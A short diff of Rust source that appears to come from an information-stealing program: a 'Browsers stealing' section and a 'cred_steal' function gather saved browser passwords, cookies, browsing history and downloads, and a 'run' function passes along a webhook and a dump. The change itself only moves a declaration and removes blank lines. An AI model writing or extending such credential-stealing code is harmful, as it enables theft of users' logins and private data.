@@ -83,8 +83,6 @@ fn run() {
         webhook,
         dump,
     );
-
-
 }
 
 // \\\ Browsers stealing \\\
@@ -124,10 +122,10 @@ fn cred_steal() -> Option<(String, String, String, String, String, String)> {
         return (passwds, history, cookies);
     }
 
+    let mut passwds: Vec<HashMap<String, (String, String)>> = Vec::new();
     // Vec<HashMap<host, (username, password)>>
     // This vector contain every passwds for browser
 
-    let mut passwds: Vec<HashMap<String, (String, String)>> = Vec::new();
     let mut history: Vec<(Vec<String>, Vec<(String, String)>, Vec<String>)> = Vec::new();
     // Vec<( Vec<terms>, Vec<(url, file)>, Vec<visited> )>
     //       ^ String    ^ String (Downloads) ^ String
